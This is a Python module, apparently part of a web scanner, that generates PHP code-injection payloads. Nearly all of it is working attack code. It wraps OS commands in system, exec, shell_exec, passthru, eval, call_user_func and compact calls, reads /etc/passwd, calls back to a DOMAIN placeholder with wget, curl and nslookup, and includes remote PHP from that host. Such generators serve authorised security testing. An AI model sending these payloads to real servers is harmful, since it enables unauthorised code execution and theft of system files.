import urllib.parse
from pluck.module import GenerationModule



class PHPCodeInjectionGenerator(GenerationModule):
    def __init__(self):
        
        self.os_commands = []
        self.php_commands = []

        self.evidence_strings = []


    def generate_payloads(self):

        result = []

        # Generate base payloads
        self.generate_commands()

        # Generate os command executors like system or passthru
        os_executors = self.generate_os_command_executors()
        result.extend(os_executors)

        # Generate php eval executions
        php_executors = self.php_eval_executions()
        result.extend(php_executors)

        # Generate the call user functions
        call_user_func_exec = self.generate_call_user_func()
        result.extend(call_user_func_exec)

        # Generate compact function payloads
        compact_payloads = self.generate_compact_payloads()
        result.extend(compact_payloads)

        # The include payloads
        include_payloads = self.generate_include_payloads()
        result.extend(include_payloads)

        url_encoded = self.url_encode(result)
        result.extend(url_encoded)
        return result

    def generate_commands(self):
        os_shell_payloads = [
            'cat /etc/passwd',
            'sleep TIMEOUT',
            'timeout /T TIMEOUT',
            'echo UNIQUE',
            'wget http://DOMAIN/UNIQUE',
            'curl http://DOMAIN/UNIQUE',
            'nslookup DOMAIN',
        ]
        php_commands = [
            'readfile("/etc/passwd")',
            'phpinfo()',
            'sleep(TIMEOUT)',
            'print "UNIQUE"'
        ]

        
        # Create OS Command payloads
        self.os_commands = [os.replace("TIMEOUT",str(self.sleep_timeout)).replace("UNIQUE",self.unique_string).replace("DOMAIN",self.domain) for os in os_shell_payloads]
        # Create PHP command payloads
        self.php_commands = [p.replace("TIMEOUT",str(self.sleep_timeout)).replace("UNIQUE",self.unique_string) for p in php_commands] 

        self.evidence_strings.append("root:x:0:0:root:/root:")
        self.evidence_strings.append(self.unique_string)



    # Generate eval with php payloads
    def php_eval_executions(self):
        result = []
        for p in self.php_commands:
            result.append(f'eval(\'{p}\')')
            result.append(f'eval(\'{p}\');')
            result.append(f';eval(\'{p}\');')
            result.append(f'<php eval(\'{p}\'); ?>')
        return result

    # generate system with os payloads
    def generate_os_command_executors(self):
        executors = ["system", "exec", "shell_exec", "passthru"]
        result = []
        for e in executors:
            for os in self.os_commands:
                if e in ["exec","shell_exec"]:
                    result.append(f'echo {e}("{os}")')
                    result.append(f'echo {e}("{os}");')
                    result.append(f'; echo {e}("{os}");')
                    result.append(f'<?php echo {e}("{os}"); ?>')
                else:    
                    result.append(f'{e}("{os}")')
                    result.append(f'{e}("{os}");')
                    result.append(f';{e}("{os}");')
                    result.append(f'<?php {e}("{os}"); ?>')
        return result

    def generate_call_user_func(self):
        result = []

        # Generate php related stuff first
        executor = ['eval']
        template = f'call_user_func(\'EXECUTOR\', \'PAYLOAD\');'
        arr_template = f'call_user_func_array(\'EXECUTOR\', [\'PAYLOAD\']);'

        for e in executor:
            for p in self.php_commands:
                t = template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                at = arr_template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                result.append(t)
                result.append(f"<?php {t} ?>")
                result.append(at)
                result.append(f"<?php {at} ?>")

        os_executors = ["system", "exec", "shell_exec", "passthru"]
        for e in os_executors:
            for p in self.os_commands:
                t = template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                at = arr_template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                result.append(t)
                result.append(f"<?php {t} ?>")
                result.append(at)
                result.append(f"<?php {at} ?>")

        os_executors2 = ["exec", "shell_exec"]
        for e in os_executors2:
            for p in self.os_commands:
                t = template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                at = arr_template.replace("EXECUTOR",e).replace("PAYLOAD",p)
                result.append(f"echo {t}")
                result.append(f"<?php echo {t} ?>")
                result.append(f" echo {at}")
                result.append(f"<?php echo {at} ?>")      



        return result

    def generate_compact_payloads(self):
        template = f'$cmd = \'EXECUTOR\';$arg = \'PAYLOAD\';$funcs = compact(\'cmd\', \'arg\'); echo $funcs[\'cmd\']($funcs[\'arg\'])'
        result = []

        for os in ["system", "exec", "shell_exec", "passthru"]:
            for p in self.os_commands:
                t = template.replace("EXECUTOR", os).replace("PAYLOAD",p)
                result.append(f"{t};")
                result.append(f"<?php {t}; ?>")

        return result

    def generate_include_payloads(self):
        result = []
        templates = [
            #"include('//DOMAIN\UNIQUE.php')",
            "include('http://DOMAIN/UNIQUE.php')",
            "echo include('/etc/passwd')",
            "echo file_get_contents('/etc/passwd')",
            #"echo file_get_contents('//DOMAIN\UNIQUE.php')",
            "echo file_get_contents('http://DOMAIN/UNIQUE.php')",
            "$socket = stream_socket_client(\"tcp://DOMAIN\"); fclose($socket);"
        ]
        for t in templates:
            r = t.replace("DOMAIN",self.domain).replace("UNIQUE",self.unique_string)
            result.append(f"{r};")
            result.append(f";{r};")
            result.append(f"<?php {r}; ?>")


        return result

    def url_encode(self, lista):
        return [urllib.parse.quote(p) for p in lista]

